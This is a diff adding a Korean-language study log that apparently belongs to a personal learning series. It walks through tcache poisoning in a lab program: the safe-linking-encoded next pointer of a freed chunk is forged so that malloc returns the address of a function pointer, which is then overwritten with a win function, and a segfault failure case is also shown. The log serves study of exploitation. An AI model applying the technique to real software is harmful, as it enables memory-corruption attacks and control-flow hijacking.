@@ -1,0 +1,115 @@
+# Day073 — Tcache Poisoning 3: Control Data Overwrite
+
+## 목표
+
+tcache poisoning으로 `&target.callback`을 `malloc` 반환값으로 만들고, 함수 포인터를 `win` 주소로 덮어 실제 제어 흐름이 바뀌는지 확인했다.
+
+```text
+tcache poisoning
+→ controlled allocation
+→ callback overwrite
+→ win 실행
+```
+
+## 핵심 구조
+
+```c
+struct Target {
+    char padding[0x20];
+    void (*callback)(void);
+};
+```
+
+초기 상태:
+
+```c
+target.callback = safe;
+```
+
+공격 목표:
+
+```c
+uintptr_t goal = (uintptr_t)&target.callback;
+```
+
+## Tcache poisoning
+
+초기 상태:
+
+```text
+tcache[0x40] -> a -> b -> NULL
+```
+
+`a->next`를 `goal`로 변경한다.
+
+```c
+uintptr_t encoded_goal =
+    goal ^ ((uintptr_t)a >> 12);
+
+*(uintptr_t *)a = encoded_goal;
+*(uintptr_t *)goal = goal >> 12;
+```
+
+조작 후:
+
+```text
+tcache[0x40] -> a -> &target.callback -> NULL
+```
+
+## Controlled allocation
+
+```c
+char *p = malloc(0x30);
+char *q = malloc(0x30);
+```
+
+결과:
+
+```text
+p == a
+q == &target.callback
+```
+
+## 함수 포인터 overwrite
+
+```c
+*(uintptr_t *)q = (uintptr_t)win;
+```
+
+검증:
+
+```text
+target.callback == win
+x/gx &target.callback == win 주소
+```
+
+이후:
+
+```c
+target.callback();
+```
+
+을 실행하면 `win()`이 호출된다.
+
+## 실패 케이스
+
+```c
+*(uintptr_t *)q = 0x4141414141414141;
+```
+
+overwrite 자체는 성공하지만 호출 시 잘못된 주소로 분기해 다음 오류가 발생했다.
+
+```text
+Segmentation fault
+```
+
+즉:
+
+```text
+control data overwrite 성공
+control-flow hijack 실패
+```
+
+## 결론
+
+free된 chunk의 encoded next를 조작해 함수 포인터 주소를 `malloc` 반환값으로 만들었고, 해당 위치에 `win` 주소를 써서 실제 간접 호출 흐름을 변경했다.
